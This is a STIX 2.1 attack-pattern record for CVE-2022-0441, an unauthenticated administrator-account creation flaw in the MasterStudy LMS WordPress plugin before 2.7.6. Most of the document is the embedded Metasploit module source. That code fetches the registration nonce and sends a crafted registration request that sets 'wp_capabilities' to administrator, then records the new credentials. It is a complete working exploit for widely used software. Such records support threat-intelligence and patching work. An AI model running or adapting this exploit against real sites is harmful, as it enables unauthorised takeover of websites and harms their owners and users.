{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b332767b-3b2c-46f3-8e9f-7d3c3f86b3b5",
    "created": "2024-08-14T16:23:21.467647Z",
    "modified": "2024-08-14T16:23:21.467651Z",
    "name": "Wordpress MasterStudy Admin Account Creation",
    "description": " MasterStudy LMS, a WordPress plugin prior to 2.7.6 is affected by a privilege escalation where an unauthenticated user is able to create an administrator account for wordpress itself. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_masterstudy_privesc.rb",
            "external_id": "wp_masterstudy_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-0441"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6"
        },
        {
            "source_name": "WPVDB",
            "external_id": "173c2efe-ee9c-4539-852f-c242b4f728ed"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress MasterStudy Admin Account Creation',\n        'Description' => %q{\n          MasterStudy LMS, a WordPress plugin,\n          prior to 2.7.6 is affected by a privilege escalation where an unauthenticated\n          user is able to create an administrator account for wordpress itself.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'Numan T\u00fcrle', # edb\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2022-0441'],\n          ['URL', 'https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6'],\n          ['EDB', '50752'],\n          ['WPVDB', '173c2efe-ee9c-4539-852f-c242b4f728ed']\n        ],\n        'DisclosureDate' => '2022-02-18',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'Username to register (blank will auto generate)', '']),\n        OptString.new('PASSWORD', [false, 'Password (blank will auto generate)', '']),\n        OptString.new('EMAIL', [false, 'Email to register (blank will auto generate)', ''])\n      ]\n    )\n  end\n\n  def check\n    unless wordpress_and_online?\n      return Msf::Exploit::CheckCode::Safe('Server not online or not detected as wordpress')\n    end\n\n    checkcode = check_plugin_version_from_readme('masterstudy-lms-learning-management-system', '2.7.6')\n    if checkcode == Msf::Exploit::CheckCode::Safe\n      return Msf::Exploit::CheckCode::Safe('MasterStudy LMS version not vulnerable')\n    end\n\n    checkcode\n  end\n\n  def get_username\n    datastore['USERNAME'].blank? ? Faker::Internet.username : datastore['USERNAME']\n  end\n\n  def get_password\n    datastore['PASSWORD'].blank? ? Rex::Text.rand_password : datastore['PASSWORD']\n  end\n\n  def get_email\n    datastore['EMAIL'].blank? ? Faker::Internet.email : datastore['EMAIL']\n  end\n\n  def run\n    username = get_username\n    password = get_password\n    email = get_email\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path))\n    fail_with(Failure::Unreachable, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, 'Request failed to return a successful response') unless res.code == 200\n    /\"stm_lms_register\":\"(?<nonce>\\w{10})\"/ =~ res.body\n    fail_with(Failure::UnexpectedReply, 'Unabled to retrieve MasterStudy Nonce from page') if nonce.nil?\n\n    print_status(\"Attempting with username: #{username} password: #{password} email: #{email}\")\n    json_post_data = JSON.pretty_generate({\n      'user_login' => username,\n      'user_email' => email,\n      'user_password' => password,\n      'user_password_re' => password,\n      'become_instructor' => '',\n      'privacy_policy' => true,\n      'degree' => '',\n      'expertize' => '',\n      'auditory' => '',\n      'additional' => [],\n      'additional_instructors' => [],\n      'profile_default_fields_for_register' => {\n        'wp_capabilities' => {\n          'value' => { 'administrator' => 1 }\n        }\n      }\n    })\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n      'ctype' => 'application/json',\n      'vars_get' => {\n        'action' => 'stm_lms_register',\n        'nonce' => nonce\n      },\n      'data' => json_post_data\n    )\n    fail_with(Failure::Unreachable, 'Connection failed') unless res\n    fail_with(Failure::UnexpectedReply, 'Request Failed to return a successful response') unless res.code == 200\n    results = res.get_json_document\n    if results['status'] == 'success'\n      print_good('Account Created Successfully')\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: username,\n        private_type: :password,\n        private_data: password,\n        service_name: 'Wordpress',\n        address: datastore['RHOST'],\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n    else\n      print_error(\"Account Creation Failed: #{results['message']}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-18"
}